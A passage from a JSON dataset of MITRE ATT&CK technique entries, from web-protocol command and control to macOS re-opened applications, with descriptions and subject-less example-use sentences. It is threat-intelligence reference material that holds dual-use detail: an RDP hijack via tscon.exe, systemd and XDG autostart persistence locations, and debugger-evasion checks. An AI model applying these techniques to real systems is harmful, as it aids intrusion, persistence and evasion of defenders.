    "description": "Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. Protocols such as HTTP/S(Citation: CrowdStrike Putter Panda) and WebSocket(Citation: Brazking-Websockets) that carry web traffic may be very common in environments. HTTP/S packets have many fields and headers in which data can be concealed. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic. ",
    "similar_words": [
      "Web Protocols"
    ],
    "id": "T1071.001"
  },
  "attack-pattern--dfd7cc1d-e1d8-4394-a198-97c4cab8aa67": {
    "name": "Visual Basic",
    "example_uses": [
      "has used VBS scripts and XLS macros for execution.",
      "used Visual Basic Scripts (VBS) on victim machines.",
      "During the   created VBScripts to run on an SSH server.",
      "can use VBScript to execute malicious code.",
      "has used VBS to install its downloader component and malicious documents with VBA macro code.",
      "has used malicious VBA macros in Microsoft Word documents and Excel spreadsheets that execute an `AutoOpen` subroutine.",
      "performs most of its operations using Windows Script Host (VBScript) and runs arbitrary shellcode .",
      "has used VBScript code on the victim's machine.",
      "can use a VBS base64 decoder function published by Motobit.",
      "has the ability to use a Microsoft Outlook backdoor macro to communicate with its C2.",
      "has used VBA macros to display a dialog box and collect victim credentials.",
      "has used VBScript in its operations.",
      "has used Visual Basic 6 (VB6) payloads.",
      "has used VBS scripts throughout its operations.",
      "has been distributed as HTA files with VBScript.",
      "has used VBA macros to execute shellcode.",
      "During   executed a VBA written malicious macro after victims download malicious DOTM files;  also used Visual Basic macro code to extract a double Base64 encoded DLL implant.",
      "can use visual basic scripts for first-stage execution.",
      "can execute malicious VBScript payloads on the victims machine.",
      "used VBA scripts.",
      "has used VBS scripts as well as embedded macros for execution.",
      "During  the threat actors used a Visual Basic script to run remote commands.",
      "has embedded VBScript components in LNK files to download additional files and automate collection.",
      "has crafted VBS-based malicious documents.",
      "has the ability to execute VBScript files.",
      "has a command to execute VBS scripts on the victims machine.",
      "has used malicious VBS e-mail attachments for execution.",
      "has used VBS scripts.",
      "executes additional VBScript code on the victim's machine.",
      "has embedded malicious macros in document templates which executed VBScript.  has also delivered Microsoft Outlook VBA projects with embedded macros.",
      "has used VBA macros in Microsoft Word attachments to drop additional files to the host.",
      "used VBS scripts to help perform tasks on the victim's machine.",
      "has used VBscript to execute malicious code.",
      "can generate shellcode outputs that execute via VBScript.",
      "adds a Visual Basic script in the Startup folder to deploy the payload.",
      "has used VBScript to execute commands and other operational tasks.",
      "has been executed through use of VBScripts.",
      "has embedded malicious macros within spearphishing attachments to download additional files.",
      "dropper creates VBS scripts on the victims machine.",
      "has used obfuscated VBA macros for execution.",
      "has used VBScript files to execute its  payload as well as macros.",
      "can execute malicious VBA macros embedded in .xlsm files.",
      "has used VBS and VBE scripts for execution.",
      "has used VBScript to execute malicious code.",
      "During  the threat actors used Word documents that prompted the victim to enable macros and run a Visual Basic script.",
      "For the   wrote malware such as  in Visual Basic.",
      "can use VBA to perform execution.",
      "has used VBS for code execution.",
      "can create a Visual Basic script to enable persistence.",
      "uses Word macros for execution.",
      "One version of  consists of VBScript scripts.",
      "malware has used VBS scripts for execution.",
      "has used Visual Basic for execution.",
      "has the ability to use Visual Basic scripts for execution.",
      "uses VBScripts.",
      "has used VBScript to execute malicious code.",
      "can download and execute VBScript files.",
      "has utilized a dropper containing malicious VBS scripts.",
      "has used VBA and embedded macros in Word documents to execute malicious code.",
      "has sent Word OLE compound documents with malicious obfuscated VBA macros that will run upon user execution.",
      "During  the threat actors used a malicious HTA file that contained a mix of HTML and JavaScript/VBScript code.",
      "has used `.vbs` scripts for execution.",
      "has used VBScript macros for execution on compromised hosts.",
      "has sent Microsoft Office Publisher documents to victims that have embedded malicious macros that execute an hta file via calling `mshta.exe`.",
      "During  threat actors used VBScript to conduct reconnaissance on targeted systems.",
      "executes VBS scripts.",
      "has sent Microsoft Word documents with embedded macros that will invoke scripts to download additional payloads.",
      "has used VBScript.",
      "has used VBS scripts.",
      "can use the VBScript function `GetRef` as part of its persistence mechanism.",
      "has a VBScript for execution.",
      "can use a VBA macro embedded in an Excel file to drop the payload.",
      "can use a malicious VBS file for execution.",
      "has used obfuscated VBA string expressions.",
      "uses VBS scripts for installing files and performing execution.",
      "can use VBS scripts to execute malicious DLLs.",
      "uses VBS files.",
      "has used VBS scripts for code execution on comrpomised machines.",
      "executes commands using VBScript.",
      "creates and uses a VBScript as part of its persistent execution.",
      "During  the threat actors used a VBA macro to execute a simple downloader that installed .",
      "can use a Visual Basic script to exclude the `C:\\` drive from Windows Defender.",
      "has used VBScript to drop and execute malware loaders.",
      "has used macros COM scriptlets and VBS scripts.",
      "has used Word documents with VBScripts to execute malicious activities.",
      "For   used malicious VBA macros within a lure document as part of the  malware installation process onto a compromised host.",
      "During the   installed a VBA script called `vba_macro.exe`. This macro dropped `FONTCACHE.DAT` the primary  implant; `rundll32.exe` for executing the malware; `NTUSER.log` an empty file; and desktop.ini the default file used to determine folder displays on Windows machines.",
      "used VBScripts to initiate the execution of payloads.",
      "used various implants including those built with VBScript on target machines.",
      "has used VBS files to execute or establish persistence for additional payloads often using file names consistent with email themes or mimicking system functionality.",
      "droppers have used VBA macros to download and execute the malware's full executable payload.",
      "During  the threat actors used Visual Basic scripts.",
      "During  the threat actors executed an encoded VBScript file using `wscript` and wrote the decoded output to a text file.",
      "has used malicious VBA code against the target system.",
      "has used VBScript to execute malicious commands and payloads.",
      "can use VBScript (VBE) code for execution.",
      "initial infection mechanisms include masquerading as pirated media that launches malicious VBScript on the victim.",
      "has used a malicious Word document for delivery with VBA macros for execution.",
      "uses AutoIt and VBS scripts throughout its execution process.",
      "For  the threat actors used a Visual Basic script embedded within a Word document to download an implant.",
      "has embedded a VBScript within a malicious Word document which is executed upon the document opening.",
      "can use VBS to download and execute malicious files.",
      "has used a VisualBasic script named `MicrosoftUpdator.vbs` for execution of a PowerShell keylogger.",
      "has included embedded Visual Basic scripts in malicious documents.",
      "has used VBScript to call wscript to execute a PowerShell command.",
      "has used VBScript to initiate the delivery of payloads.",
      "executes shellcode and a VBA script to decode Base64 strings.",
      "has created VBScripts to run an SSH server.",
      "has used Visual Basic to download malicious payloads.  has also used malicious VBA macros within maldocs disguised as forms that trigger when a victim types any content into the lure.",
      "has used VBS code on victims systems.",
      "has several VBS scripts used throughout the malware's lifecycle.",
      "s dropper uses VBS files to install payloads and perform execution.",
      "has the ability to save and execute VBScript.",
      "has used macros in s as well as executed VBScripts on victim machines.",
      "has used embedded VBScript to download malicious payloads from C2.",
      "has utilized malicious VBS scripts in malware.",
      "has executed a script named cln.vbs on compromised hosts.",
      "has used VBScript to run malicious files.",
      "can run arbitrary Visual Basic scripts and commands passed to it.",
      "has been installed using a VBA macro.",
      "has used VBScript to query anti-virus products.",
      "is a VisualBasic script (VBS) object that calls multiple other operating system functions during execution.",
      "has used a VBScript to query anti-virus products.",
      "can execute additional VisualBasic content.",
      "During   used VBS droppers to deliver and establish persistence for the  backdoor.",
      "During   used VBS droppers to deploy malware."
    ],
    "description": "Adversaries may abuse Visual Basic (VB) for execution. VB is a programming language created by Microsoft with interoperability with many Windows technologies such as [Component Object Model](https://attack.mitre.org/techniques/T1559/001) and the [Native API](https://attack.mitre.org/techniques/T1106) through the Windows API. Although tagged as legacy with no planned future evolutions, VB is integrated and supported in the .NET Framework and cross-platform .NET Core.(Citation: VB .NET Mar 2020)(Citation: VB Microsoft)Derivative languages based on VB have also been created, such as Visual Basic for Applications (VBA) and VBScript. VBA is an event-driven programming language built into Microsoft Office, as well as several third-party applications.(Citation: Microsoft VBA)(Citation: Wikipedia VBA) VBA enables documents to contain macros used to automate the execution of tasks and other functionality on the host. VBScript is a default scripting language on Windows hosts and can also be used in place of [JavaScript](https://attack.mitre.org/techniques/T1059/007) on HTML Application (HTA) webpages served to Internet Explorer (though most modern browsers do not come with VBScript support).(Citation: Microsoft VBScript)Adversaries may use VB payloads to execute malicious commands. Common malicious usage includes automating execution of behaviors with VBScript or embedding VBA content into [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001) payloads (which may also involve [Mark-of-the-Web Bypass](https://attack.mitre.org/techniques/T1553/005) to enable execution).(Citation: Default VBS macros Blocking )",
    "similar_words": [
      "Visual Basic"
    ],
    "id": "T1059.005"
  },
  "attack-pattern--dfebc3b7-d19d-450b-81c7-6dafe4184c04": {
    "name": "Hidden File System",
    "example_uses": [
      "has used an encrypted virtual file system stored in the Windows Registry.",
      "has used a portable FAT16 partition image placed in %TEMP% as a hidden file system.",
      "has used a hidden file system to store some of its components.",
      "has used unallocated disk space between partitions for a hidden file system that stores components of the Nemesis bootkit.",
      "can use concealed storage mechanisms including an NTFS or FAT-16 filesystem encrypted with CAST-128 in CBC mode.",
      "has used a hidden file system that is stored as a file on disk."
    ],
    "description": "Adversaries may use a hidden file system to conceal malicious activity from users and security tools. File systems provide a structure to store and access data from physical storage. Typically, a user engages with a file system through applications that allow them to access files and directories, which are an abstraction from their physical location (ex: disk sector). Standard file systems include FAT, NTFS, ext4, and APFS. File systems can also contain other structures, such as the Volume Boot Record (VBR) and Master File Table (MFT) in NTFS.(Citation: MalwareTech VFS Nov 2014)Adversaries may use their own abstracted file system, separate from the standard file system present on the infected system. In doing so, adversaries can hide the presence of malicious components and file input/output from security tools. Hidden file systems, sometimes referred to as virtual file systems, can be implemented in numerous ways. One implementation would be to store a file system in reserved disk space unused by disk structures or standard file system partitions.(Citation: MalwareTech VFS Nov 2014)(Citation: FireEye Bootkits) Another implementation could be for an adversary to drop their own portable partition image as a file on top of the standard file system.(Citation: ESET ComRAT May 2020) Adversaries may also fragment files across the existing file system structure in non-standard ways.(Citation: Kaspersky Equation QA)",
    "similar_words": [
      "Hidden File System"
    ],
    "id": "T1564.005"
  },
  "attack-pattern--dfefe2ed-4389-4318-8762-f0272b350a1b": {
    "name": "Systemd Service",
    "example_uses": [
      "has established persistence through the creation of a cryptocurrency mining system service using systemctl.",
      "During the   configured Systemd to maintain persistence of GOGETTER specifying the `WantedBy=multi-user.target` configuration to run GOGETTER when the system begins accepting user logins.",
      "can be used to establish persistence using a systemd service.",
      "has established persistence using a systemd service.",
      "Depending on the Linux distribution and when executing with root permissions  may install persistence using a `.service` file under the `/lib/systemd/system/` folder.",
      "can copy a script to the user owned `/usr/lib/systemd/system/` directory with a symlink mapped to a `root` owned directory `/etc/ystem/system` in the unit configuration file's `ExecStart` directive to establish persistence and elevate privileges.",
      "has a hardcoded location under systemd that it uses to achieve persistence if it is running as root.",
      "has installed a systemd service script to maintain persistence.",
      "has started a monero service.",
      "creates a systemd service named `syslogd` for persistence."
    ],
    "description": "Adversaries may create or modify systemd services to repeatedly execute malicious payloads as part of persistence. Systemd is a system and service manager commonly used for managing background daemon processes (also known as services) and other system resources.(Citation: Linux man-pages: systemd January 2014) Systemd is the default initialization (init) system on many Linux distributions replacing legacy init systems, including SysVinit and Upstart, while remaining backwards compatible.  Systemd utilizes unit configuration files with the `.service` file extension to encode information about a service's process. By default, system level unit files are stored in the `/systemd/system` directory of the root owned directories (`/`). User level unit files are stored in the `/systemd/user` directories of the user owned directories (`$HOME`).(Citation: lambert systemd 2022) Inside the `.service` unit files, the following directives are used to execute commands:(Citation: freedesktop systemd.service)  * `ExecStart`, `ExecStartPre`, and `ExecStartPost` directives execute when a service is started manually by `systemctl` or on system start if the service is set to automatically start.* `ExecReload` directive executes when a service restarts. * `ExecStop`, `ExecStopPre`, and `ExecStopPost` directives execute when a service is stopped.  Adversaries have created new service files, altered the commands a `.service` files directive executes, and modified the user directive a `.service` file executes as, which could result in privilege escalation. Adversaries may also place symbolic links in these directories, enabling systemd to find these payloads regardless of where they reside on the filesystem.(Citation: Anomali Rocke March 2019)(Citation: airwalk backdoor unix systems)(Citation: Rapid7 Service Persistence 22JUNE2016) The `.service` files User directive can be used to run service as a specific user, which could result in privilege escalation based on specific user/group permissions. Systemd services can be created via systemd generators, which support the dynamic generation of unit files. Systemd generators are small executables that run during boot or configuration reloads to dynamically create or modify systemd unit files by converting non-native configurations into services, symlinks, or drop-ins (i.e., [Boot or Logon Initialization Scripts](https://attack.mitre.org/techniques/T1037)).(Citation: Elastic Security Labs Linux Persistence 2024)(Citation: Pepe Berba Systemd 2022)",
    "similar_words": [
      "Systemd Service"
    ],
    "id": "T1543.002"
  },
  "attack-pattern--e0033c16-a07e-48aa-8204-7c3ca669998c": {
    "name": "RDP Hijacking",
    "example_uses": [
      "enumerates current remote desktop sessions and tries to execute the malware on each session.",
      "has targeted victims with remote administration tools including RDP."
    ],
    "description": "Adversaries may hijack a legitimate users remote desktop session to move laterally within an environment. Remote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS).(Citation: TechNet Remote Desktop Services)Adversaries may perform RDP session hijacking which involves stealing a legitimate user's remote session. Typically, a user is notified when someone else is trying to steal their session. With System permissions and using Terminal Services Console, `c:\\windows\\system32\\tscon.exe [session number to be stolen]`, an adversary can hijack a session without the need for credentials or prompts to the user.(Citation: RDP Hijacking Korznikov) This can be done remotely or locally and with active or disconnected sessions.(Citation: RDP Hijacking Medium) It can also lead to [Remote System Discovery](https://attack.mitre.org/techniques/T1018) and Privilege Escalation by stealing a Domain Admin or higher privileged account session. All of this can be done by using native Windows commands, but it has also been added as a feature in red teaming tools.(Citation: Kali Redsnarf)",
    "similar_words": [
      "RDP Hijacking"
    ],
    "id": "T1563.002"
  },
  "attack-pattern--e0232cb0-ded5-4c2e-9dc7-2893142a5c11": {
    "name": "XDG Autostart Entries",
    "example_uses": [
      "can use XDG Autostart Entries to establish persistence on Linux systems.",
      "can use an XDG Autostart to establish persistence.",
      "can use an XDG Autostart to establish persistence.",
      "When executing with user-level permissions  can install persistence using a .desktop file under the `$HOME/.config/autostart/` folder.",
      "If executing without root privileges  adds a `.desktop` configuration file to the user's `~/.config/autostart` directory."
    ],
    "description": "Adversaries may add or modify XDG Autostart Entries to execute malicious programs or commands when a users desktop environment is loaded at login. XDG Autostart entries are available for any XDG-compliant Linux system. XDG Autostart entries use Desktop Entry files (`.desktop`) to configure the users desktop environment upon user login. These configuration files determine what applications launch upon user login, define associated applications to open specific file types, and define applications used to open removable media.(Citation: Free Desktop Application Autostart Feb 2006)(Citation: Free Desktop Entry Keys)Adversaries may abuse this feature to establish persistence by adding a path to a malicious binary or command to the `Exec` directive in the `.desktop` configuration file. When the users desktop environment is loaded at user login, the `.desktop` files located in the XDG Autostart directories are automatically executed. System-wide Autostart entries are located in the `/etc/xdg/autostart` directory while the user entries are located in the `~/.config/autostart` directory.Adversaries may combine this technique with [Masquerading](https://attack.mitre.org/techniques/T1036) to blend malicious Autostart entries with legitimate programs.(Citation: Red Canary Netwire Linux 2022)",
    "similar_words": [
      "XDG Autostart Entries"
    ],
    "id": "T1547.013"
  },
  "attack-pattern--e196b5c5-8118-4a1c-ab8a-936586ce3db5": {
    "name": "Server",
    "example_uses": [
      "has compromised servers to stage malicious tools.",
      "has used compromised PRTG servers from other organizations for C2.",
      "has compromised legitimate websites to host C2 and malware modules.",
      "For  the threat actors compromised a server they used as part of the campaign's infrastructure.",
      "has used compromised servers as infrastructure.",
      "has compromised otherwise legitimate sites as staging servers for second-stage payloads.",
      "compromised legitimate Linux servers running the EXIM mail transfer agent for use in subsequent campaigns.",
      "During  threat actors compromised web servers to use for C2.",
      "For   compromised servers to host their malicious tools.",
      "has served fake updates via legitimate websites that have been compromised.",
      "has used compromised web servers as part of their operational infrastructure.",
      "has used compromised Paessler Router Traffic Grapher (PRTG) servers from other organizations for C2.",
      "compromised web servers hosting updates for software as part of a supply chain intrusion.",
      "During   compromised an Israeli human resources site to use as a C2 server.",
      "has used compromised legitimate websites as command and control nodes for operations.",
      "During   compromised an Israeli job portal to use for a C2 server."
    ],
    "description": "Adversaries may compromise third-party servers that can be used during targeting. Use of servers allows an adversary to stage, launch, and execute an operation. During post-compromise activity, adversaries may utilize servers for various tasks, including for Command and Control.(Citation: TrendMicro EarthLusca 2022) Instead of purchasing a [Server](https://attack.mitre.org/techniques/T1583/004) or [Virtual Private Server](https://attack.mitre.org/techniques/T1583/003), adversaries may compromise third-party servers in support of operations.Adversaries may also compromise web servers to support watering hole operations, as in [Drive-by Compromise](https://attack.mitre.org/techniques/T1189), or email servers to support [Phishing](https://attack.mitre.org/techniques/T1566) operations.",
    "similar_words": [
      "Server"
    ],
    "id": "T1584.004"
  },
  "attack-pattern--e24fcba8-2557-4442-a139-1ee2f2e784db": {
    "name": "Cloud Service Discovery",
    "example_uses": [
      "can enumerate information about a variety of cloud services such as Office 365 and Sharepoint instances or OpenID Configurations.",
      "can enumerate Azure AD applications and service principals.",
      "can enumerate AWS services such as CloudTrail and CloudWatch."
    ],
    "description": "An adversary may attempt to enumerate the cloud services running on a system after gaining access. These methods can differ from platform-as-a-service (PaaS), to infrastructure-as-a-service (IaaS), or software-as-a-service (SaaS). Many services exist throughout the various cloud providers and can include Continuous Integration and Continuous Delivery (CI/CD), Lambda Functions, Entra ID, etc. They may also include security services, such as AWS GuardDuty and Microsoft Defender for Cloud, and logging services, such as AWS CloudTrail and Google Cloud Audit Logs.Adversaries may attempt to discover information about the services enabled throughout the environment. Azure tools and APIs, such as the Microsoft Graph API and Azure Resource Manager API, can enumerate resources and services, including applications, management groups, resources and policy definitions, and their relationships that are accessible by an identity.(Citation: Azure - Resource Manager API)(Citation: Azure AD Graph API)For example, Stormspotter is an open source tool for enumerating and constructing a graph for Azure resources and services, and Pacu is an open source AWS exploitation framework that supports several methods for discovering cloud services.(Citation: Azure - Stormspotter)(Citation: GitHub Pacu)Adversaries may use the information gained to shape follow-on behaviors, such as targeting data or credentials from enumerated services or evading identified defenses through [Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001) or [Disable or Modify Cloud Logs](https://attack.mitre.org/techniques/T1562/008).",
    "similar_words": [
      "Cloud Service Discovery"
    ],
    "id": "T1526"
  },
  "attack-pattern--e3b168bd-fcd7-439e-9382-2e6c2f63514d": {
    "name": "Domain Properties",
    "example_uses": [
      "conducted technical reconnaissance of the Parliament of Georgia's official internet domain prior to its 2019 attack.",
      "can gather information about a tenants domains using public Microsoft APIs."
    ],
    "description": "Adversaries may gather information about the victim's network domain(s) that can be used during targeting. Information about domains and their properties may include a variety of details, including what domain(s) the victim owns as well as administrative data (ex: name, registrar, etc.) and more directly actionable information such as contacts (email addresses and phone numbers), business addresses, and name servers.Adversaries may gather this information in various ways, such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about victim domains and their properties may also be exposed to adversaries via online or other accessible data sets (ex: [WHOIS](https://attack.mitre.org/techniques/T1596/002)).(Citation: WHOIS)(Citation: DNS Dumpster)(Citation: Circl Passive DNS) Where third-party cloud providers are in use, this information may also be exposed through publicly available API endpoints, such as GetUserRealm and autodiscover in Office 365 environments.(Citation: Azure Active Directory Reconnaisance)(Citation: Office 265 Azure Domain Availability) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596), [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593), or [Phishing for Information](https://attack.mitre.org/techniques/T1598)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [Phishing](https://attack.mitre.org/techniques/T1566)).",
    "similar_words": [
      "Domain Properties"
    ],
    "id": "T1590.001"
  },
  "attack-pattern--e3b6daca-e963-4a69-aee6-ed4fd653ad58": {
    "name": "Software Discovery",
    "example_uses": [
      "has searched the compromised system for banking applications.",
      "uses ps aux with the grep command to enumerate common browsers and system processes potentially impacting 's exfiltration capabilities.",
      "searches for the kubectl binary.",
      "has queried the Registry on compromised systems for information on installed software.",
      "can list the installed applications on a compromised host.",
      "gathered a list of installed software on the infected host.",
      "lists all installed software for the infected machine.",
      "can identify Chrome Opera Edge Chromium and Firefox browsers including version number on a compromised host.",
      "can check the victim's default browser to determine which process to inject its communications module into.",
      "The  System Profiler can discover applications through the browser and identify the version of Java the target has.",
      "has used a script to detect installed software on targeted systems.",
      "has enumerated installed software on compromised systems.",
      "has collected a list of installed software on the system.",
      "can enumerate running software on a targeted system.",
      "has used tools to enumerate software installed on an infected host.",
      "can gather the victim's Internet Explorer version.",
      "has used malware to identify installed software.",
      "has used a PowerShell backdoor to check for Skype connectivity on the target machine.",
      "can query the Registry for installed applications.",
      "has the ability to identify the Internet Explorer (IE) version on an infected host.",
      "has utilized the PowerShell script `Get-DataInfo.ps1` to collect installed backup software information from a compromised machine.",
      "can list PHP server configuration details.",
      "has the ability to enumerate what browser is being used as well as version information for Safari.",
      "has collected browser information from a compromised host.",
      "has used tools to enumerate software installed on an infected host.",
      "has searched the victim system for the InstallUtil.exe program and its version.",
      "can collect information about installed software used by specific users software executed on user login and software executed by each system.",
      "can identify the victim's browser in order to serve the correct fake update page.",
      "During  the threat actors deployed a file called `DeployJava.js` to fingerprint installed software on a victim system prior to exploit delivery.",
      "has the ability to gather information on installed applications.",
      "can collect a list of installed software from an infected host.",
      "can retrieve a list of applications from the SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths registry key.",
      "can check for the Telegram installation directory by enumerating the files on disk.",
      "has enumerated programs installed on an infected machine.",
      "can collect information on installed applications.",
      "can enumerate a list of installed programs.",
      "has the ability to identify installed programs on a compromised host.",
      "During  threat actors collected a list of installed software on the infected system.",
      "can collect .NET PowerShell and Python information from an infected host.",
      "can scan victim drives to look for specific banking software on the machine to determine next actions.",
      "backdoor could list the infected system's installed software.",
      "can check for the presence and version of the .NET framework.",
      "has the ability to search systems for installed applications.",
      "can list installed software on compromised systems.",
      "is capable of identifying running software on victim machines.",
      "variants use COM objects to enumerate installed applications from the AppsFolder on victim machines.",
      "During   used browser data dumper tools to create a list of users with Google Chrome installed.",
      "If sent the command `16001`  uses the `NSFileManger contentsOfDirectoryAtPath()` to enumerate the Applications folder to collect the bundle name bundle identifier and version information from each application's `info.plist` file. The results are then converted into a JSON blob for exfiltration."
    ],
    "description": "Adversaries may attempt to get a listing of software and software versions that are installed on a system or in a cloud environment. Adversaries may use the information from [Software Discovery](https://attack.mitre.org/techniques/T1518) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.Such software may be deployed widely across the environment for configuration management or security reasons, such as [Software Deployment Tools](https://attack.mitre.org/techniques/T1072), and may allow adversaries broad access to infect devices or move laterally.Adversaries may attempt to enumerate software for a variety of reasons, such as figuring out what security measures are present or if the compromised system has a version of software that is vulnerable to [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068).",
    "similar_words": [
      "Software Discovery"
    ],
    "id": "T1518"
  },
  "attack-pattern--e49920b0-6c54-40c1-9571-73723653205f": {
    "name": "Cloud Service Dashboard",
    "example_uses": [
      "abused AWS Systems Manager Inventory to identify targets on the compromised network prior to lateral movement."
    ],
    "description": "An adversary may use a cloud service dashboard GUI with stolen credentials to gain useful information from an operational cloud environment, such as specific services, resources, and features. For example, the GCP Command Center can be used to view all assets, review findings of potential security risks, and run additional queries, such as finding public IP addresses and open ports.(Citation: Google Command Center Dashboard)Depending on the configuration of the environment, an adversary may be able to enumerate more information via the graphical dashboard than an API. This also allows the adversary to gain information without manually making any API requests.",
    "similar_words": [
      "Cloud Service Dashboard"
    ],
    "id": "T1538"
  },
  "attack-pattern--e49ee9d2-0d98-44ef-85e5-5d3100065744": {
    "name": "Thread Local Storage",
    "example_uses": [
      "has injected code into target processes via thread local storage callbacks."
    ],
    "description": "Adversaries may inject malicious code into processes via thread local storage (TLS) callbacks in order to evade process-based defenses as well as possibly elevate privileges. TLS callback injection is a method of executing arbitrary code in the address space of a separate live process. TLS callback injection involves manipulating pointers inside a portable executable (PE) to redirect a process to malicious code before reaching the code's legitimate entry point. TLS callbacks are normally used by the OS to setup and/or cleanup data used by threads. Manipulating TLS callbacks may be performed by allocating and writing to specific offsets within a process memory space using other [Process Injection](https://attack.mitre.org/techniques/T1055) techniques such as [Process Hollowing](https://attack.mitre.org/techniques/T1055/012).(Citation: FireEye TLS Nov 2017)Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via TLS callback injection may also evade detection from security products since the execution is masked under a legitimate process. ",
    "similar_words": [
      "Thread Local Storage"
    ],
    "id": "T1055.005"
  },
  "attack-pattern--e4dc8c01-417f-458d-9ee0-bb0617c1b391": {
    "name": "Debugger Evasion",
    "example_uses": [
      "can use the `CheckRemoteDebuggerPresent` function to detect the presence of a debugger.",
      "checks the BeingDebugged flag in the PEB structure during execution to identify if the malware is being debugged.",
      "can check for debugging tools.",
      "can use `IsDebuggerPresent` to detect whether a debugger is present on a victim.",
      "The  dropper can check system flags CPU registers CPU instructions process timing system libraries and APIs to determine if a debugger is present.",
      "has used `is_debugger_present` as part of its environmental checks.",
      "During   used tools that used the `IsDebuggerPresent` call to detect debuggers.",
      "can detect debuggers by using functions such as `DebuggerIsAttached` and `DebuggerIsLogging`.  can also detect profilers by verifying the `COR_ENABLE_PROFILING` environment variable is present and active.",
      "can search for debugging tools on a compromised host.",
      "uses a function named is_debugging to perform anti-debugging logic. The function invokes sysctl checking the returned value of P_TRACED.  also calls ptrace with the PTRACE_DENY_ATTACH flag to prevent debugging.",
      "can search for tools used in static analysis.",
      "features several methods to evade debugging by analysts including checks for active debuggers the use of breakpoints during execution and checking various system information items such as system memory and the number of processors.",
      "leverages anti-debugging mechanisms through the use of ThreadHideFromDebugger.",
      "has the ability to check for the presence of debuggers.",
      "has checked for debugger strings by invoking `GetForegroundWindow` and looks for strings containing x32dbg x64dbg windbg ollydbg dnspy immunity debugger hyperdbg debug debugger cheat engine cheatengine and ida.",
      "can detect it is being run in the context of a debugger.",
      "variants include functionality to identify and evade debuggers.",
      "uses anti-debugging mechanisms such as calling `NtQueryInformationProcess` with `InfoClass=7` referencing `ProcessDebugPort` to determine if it is being analyzed.",
      "can check heap memory parameters for indications of a debugger and stop the flow of events to the attached debugger in order to hinder dynamic analysis."
    ],
    "description": "Adversaries may employ various means to detect and avoid debuggers. Debuggers are typically used by defenders to trace and/or analyze the execution of potential malware payloads.(Citation: ProcessHacker Github)Debugger evasion may include changing behaviors based on the results of the checks for the presence of artifacts indicative of a debugged environment. Similar to [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497), if the adversary detects a debugger, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for debugger artifacts before dropping secondary or additional payloads.Specific checks will vary based on the target and/or adversary. On Windows, this may involve [Native API](https://attack.mitre.org/techniques/T1106) function calls such as IsDebuggerPresent() and  NtQueryInformationProcess(), or manually checking the BeingDebugged flag of the Process Environment Block (PEB). On Linux, this may involve querying `/proc/self/status` for the `TracerPID` field, which indicates whether or not the process is being traced by dynamic analysis tools.(Citation: Cado Security P2PInfect 2023)(Citation: Positive Technologies Hellhounds 2023) Other checks for debugging artifacts may also seek to enumerate hardware breakpoints, interrupt assembly opcodes, time checks, or measurements if exceptions are raised in the current process (assuming a present debugger would swallow or handle the potential error).(Citation: hasherezade debug)(Citation: AlKhaser Debug)(Citation: vxunderground debug)Malware may also leverage Structured Exception Handling (SEH) to detect debuggers by throwing an exception and detecting whether the process is suspended. SEH handles both hardware and software expectations, providing control over the exceptions including support for debugging. If a debugger is present, the programs control will be transferred to the debugger, and the execution of the code will be suspended. If the debugger is not present, control will be transferred to the SEH handler, which will automatically handle the exception and allow the programs execution to continue.(Citation: Apriorit)Adversaries may use the information learned from these debugger checks during automated discovery to shape follow-on behaviors. Debuggers can also be evaded by detaching the process or flooding debug logs with meaningless data via messages produced by looping [Native API](https://attack.mitre.org/techniques/T1106) function calls such as OutputDebugStringW().(Citation: wardle evilquest partii)(Citation: Checkpoint Dridex Jan 2021)",
    "similar_words": [
      "Debugger Evasion"
    ],
    "id": "T1622"
  },
  "attack-pattern--e51137a5-1cdc-499e-911a-abaedaa5ac86": {
    "name": "Space after Filename",
    "example_uses": [
      "puts a space after a false .jpg extension so that execution actually goes through the Terminal.app program.",
      "has put several spaces before a file extension to avoid detection and suspicion."
    ],
    "description": "Adversaries can hide a program's true filetype by changing the extension of a file. With certain file types (specifically this does not work with .app extensions), appending a space to the end of a filename will change how the file is processed by the operating system.For example, if there is a Mach-O executable file called evil.bin, when it is double clicked by a user, it will launch Terminal.app and execute. If this file is renamed to evil.txt, then when double clicked by a user, it will launch with the default text editing application (not executing the binary). However, if the file is renamed to evil.txt  (note the space at the end), then when double clicked by a user, the true file type is determined by the OS and handled appropriately and the binary will be executed (Citation: Mac Backdoors are back).Adversaries can use this feature to trick users into double clicking benign-looking files of any format and ultimately executing something malicious.",
    "similar_words": [
      "Space after Filename"
    ],
    "id": "T1036.006"
  },
  "attack-pattern--e5cc9e7a-e61a-46a1-b869-55fb6eab058e": {
    "name": "Re-opened Applications",
    "example_uses": [],
    "description": "Adversaries may modify plist files to automatically run an application when a user logs in. When a user logs out or restarts via the macOS Graphical User Interface (GUI), a prompt is provided to the user with a checkbox to \"Reopen windows when logging back in\".(Citation: Re-Open windows on Mac) When selected, all applications currently open are added to a property list file named com.apple.loginwindow.[UUID].plist within the ~/Library/Preferences/ByHost directory.(Citation: Methods of Mac Malware Persistence)(Citation: Wardle Persistence Chapter) Applications listed in this file are automatically reopened upon the users next logon.Adversaries can establish [Persistence](https://attack.mitre.org/tactics/TA0003) by adding a malicious application path to the com.apple.loginwindow.[UUID].plist file to execute payloads when a user logs in.",
    "similar_words": [
      "Re-opened Applications"
    ],
    "id": "T1547.007"
